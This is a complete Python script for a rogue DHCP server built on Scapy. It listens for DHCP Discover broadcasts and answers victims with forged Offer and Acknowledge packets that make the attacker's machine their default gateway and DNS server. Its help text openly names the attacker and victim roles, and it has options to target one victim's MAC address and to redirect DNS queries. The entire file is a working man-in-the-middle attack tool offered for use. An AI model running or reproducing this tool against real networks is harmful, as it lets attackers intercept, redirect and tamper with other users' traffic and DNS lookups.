#!/usr/bin/python3

from icecream import ic
import netifaces
import logging
import importlib
import sys

# Suppress Scapy warnings before importing
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from sys import argv, exit
import re
import socket


# Globals
INSPECT_MODE = False

# Constants

IP_BROADCAST        = '255.255.255.255'
DHCP_CLIENT_PORT    = 68 
DHCP_SERVER_PORT    = 67


class Singleton(type):
    _instances = {}
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]


class Spoofer(metaclass=Singleton):
    def setup(self, my_mac, my_ip, assign_ip):
        self.my_mac = my_mac
        self.my_ip = my_ip
        self.assign_ip = assign_ip

        self.target_mac=''
        self.dns_server=''

    def validate(self):
        return is_ip_valid(self.my_ip) and is_ip_valid(self.assign_ip) \
            and is_mac_valid(self.my_mac) and ((self.target_mac == '') or is_mac_valid(self.target_mac))\
                and ((self.dns_server == '') or is_ip_valid(self.dns_server))

    def is_trigger(self, discover_mac):
        return self.target_mac == '' or self.target_mac == discover_mac

    
    def build_offer_message(self, discover):
        to_mac = discover[Ether].src

        # Add Ether
        frame = Ether(src=self.my_mac, dst=to_mac)

        # Add IP with the free address
        frame /= IP(src=self.my_ip, dst=self.assign_ip)

        # Add Transportation layer
        frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)

        # Add legacy BOOTP layer
        frame /= BOOTP()

        # Change BOOTP options
        frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
        frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
        frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
        frame[BOOTP].xid = discover[BOOTP].xid
        frame[BOOTP].secs = 0
        frame[BOOTP].flags = None
        frame[BOOTP].ciaddr = '0.0.0.0'
        frame[BOOTP].yiaddr = self.assign_ip
        frame[BOOTP].siaddr = self.my_ip
        frame[BOOTP].giaddr = '0.0.0.0'
        frame[BOOTP].chaddr = mac_to_bytes(discover[Ether].src)

        # Add DHCP Extension
        frame /= DHCP()

        # Change DHCP fields
        
        opts = [('message-type', 2),\
                ('server_id', self.my_ip),\
                ('lease_time', 43200),\
                ('renewal_time', 21600),\
                ('rebinding_time', 37800),\
                ('subnet_mask', '255.255.255.0'),\
                ('broadcast_address', '192.168.1.255'),\
                ('router', self.my_ip),\
                ('name_server', self.dns_server),\
                ('domain', b'lan'),\
                'end']\

        # Write options
        frame[DHCP].options = opts

        return frame

    
    def build_acknowledge_message(self, request):
        to_mac = request[Ether].src

        # Add Ether
        frame = Ether(src=self.my_mac, dst=to_mac)

        # Add IP with the free address
        frame /= IP(src=self.my_ip, dst=self.assign_ip)

        # Add Transportation layer
        frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)

        # Add legacy BOOTP layer
        frame /= BOOTP()

        # Change BOOTP options
        frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
        frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
        frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
        frame[BOOTP].xid = request[BOOTP].xid
        frame[BOOTP].secs = 0
        frame[BOOTP].flags = None
        frame[BOOTP].ciaddr = '0.0.0.0'
        frame[BOOTP].yiaddr = self.assign_ip
        frame[BOOTP].siaddr = self.my_ip
        frame[BOOTP].giaddr = '0.0.0.0'
        frame[BOOTP].chaddr = mac_to_bytes(request[Ether].src)

        # Add DHCP Extension
        frame /= DHCP()

        # Change DHCP fields
        req_opts = request[DHCP].options
        comp_name = ''
        hostname = ''
        comp_name_res = ''

        for x in req_opts:
            ic(', '.join([str(y) for y in x]))
            if x[0].lower() == 'hostname':
                hostname = x[1]
            if x[0].lower() == 'client_fqdn':
                comp_name = x[1]
                break
        
        comp_name_res = comp_name if comp_name != '' else \
            hostname if hostname != '' else 'XXXX'

        opts = [('message-type', 5),\
                ('server_id', self.my_ip),\
                ('lease_time', 43200),\
                ('renewal_time', 21600),\
                ('rebinding_time', 37800),\
                ('subnet_mask', '255.255.255.0'),\
                ('broadcast_address', '192.168.1.255'),\
                ('router', self.my_ip),\
                ('name_server', self.dns_server),\
                ('domain', b'lan'),\
                ( ('client_FQDN') if comp_name != '' else ('hostname') , comp_name_res),\
                'end']

        # Write options
        frame[DHCP].options = opts

        return frame



class DHCP_FLAGS:
    # OP
    BOOTREQUEST=1
    BOOTREPLY=2

    # htype
    HTYPE_DEF=1

    # hlen
    HTYPE_LEN_DEF=6


def get_my_default_gateway():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]

# Checks if a packet has DHCP layers
def is_dhcp_layers(pack):
    # Filter by layers
    return pack.haslayer(DHCP) and pack.haslayer(BOOTP) and pack.haslayer(UDP)\
    and pack.haslayer(IP) and pack.haslayer(Ether)


# Checks if a packet is DHCP type discover
def is_discover_filter(pack):
    if is_dhcp_layers(pack):
        # Check ports
        if pack[UDP].sport == DHCP_CLIENT_PORT and pack[UDP].dport == DHCP_SERVER_PORT:
            # Check if broadcast
            if pack[Ether].dst == 'ff:ff:ff:ff:ff:ff' and  pack[IP].dst == IP_BROADCAST:
                opts = pack[DHCP].options
                return opts[0][1] == DHCP_FLAGS.BOOTREQUEST

    return False


def import_scapy():
    globals().update(importlib.import_module('scapy.all').__dict__)


def is_mac_valid(x):
    return bool(re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower()))


def is_ip_valid(x):
    try:
        socket.inet_aton(x)
        return True
    except:
        pass
    
    return False


mac_to_bytes = lambda mac: (eval('0x'+''.join([x for x in mac if x != ':']))).to_bytes(6, byteorder='big')


def print_help():
    print('./dhcp-spoof attacker_mac attacker_ip unused_ip [flags]')
    print('')
    print('Arguments')
    print('\tattacker_mac - MAC address of attacker')
    print('\tattacker_ip - IP to set as default gateway')
    print('\tunused_ip - IP to assign for victim')
    print('')
    print('Flags: ')
    print('\t-h,  help')
    print('')
    print('\t-t,  target\t- MAC address of specific victim you want to attack')
    print('')
    print('\t--dns,\t\t- redirect victim DNS queries to this machine')
    print('')
    print('\t-i,\t\t- inspect DHCP Discover without sending anything on net')

def gen_request_filter(xid, src_mac):
    return lambda pack: pack.haslayer(BOOTP) and pack[BOOTP].xid == xid and pack.haslayer(Ether) and pack[Ether].src == src_mac


# Prints an example discovery
def handle_DHCP_discover(pack):
    global INSPECT_MODE

    spoof = Spoofer()
   
    print('Got Discover from ----> ', end='')
    print(pack[Ether].src)

    if INSPECT_MODE:
        return

    if spoof.is_trigger(pack[Ether].src):
        print('=-=-=-=- Sending Offer =-=-=-=-')

        # Send offer
        current_offer = spoof.build_offer_message(pack)
        sendp(current_offer)

        # Build filter func
        req_filt = gen_request_filter(pack[BOOTP].xid, pack[Ether].src)

        # Sniff for request
        request = sniff(lfilter=req_filt, count=1, timeout=4)

        if(len(list(request)) == 0):
            print('Missed Request packet')
            return
        
        request = request[0]

        print('REQ')
        request.show()

        # Send acknowledge
        print('=-=-=-=- Sending Acknowledge =-=-=-=-')
        ack = spoof.build_acknowledge_message(request)


        print('ACK')
        ack.show()

        sendp(ack)

        if spoof.target_mac == '':
            exit(0)


def main():
    global INSPECT_MODE

    if len(sys.argv) < 4 or '-h' in sys.argv:
        print_help()
    else:
        spoof = Spoofer()
        spoof.setup(sys.argv[1], sys.argv[2], sys.argv[3])

        if not spoof.validate():
            print('Invalid IP or MAC')
            exit(1)

        # Check for specific target
        if '-t' in argv:
            try:
                spoof.target_mac = argv[argv.index('-t') + 1]

                if not spoof.validate():
                    print('Invalid target')
                    exit(1)
            except:
                print('Target not specified')
                exit(1)

        # Check for DNS manipulation
        if '--dns' in argv:
            spoof.dns_server = argv[argv.index('--dns') + 1]

            if not spoof.validate():
                print('Not a valid DNS server')
                exit(1)
        else:
            try:
                spoof.dns_server = get_my_default_gateway()
            except:
                spoof.dns_server = '8.8.8.8'

        if '-i' in argv:
            INSPECT_MODE = True

        import_scapy()

        print('Listening...')
        sniff(lfilter=is_discover_filter, prn=handle_DHCP_discover)


if __name__ == "__main__":
    main()
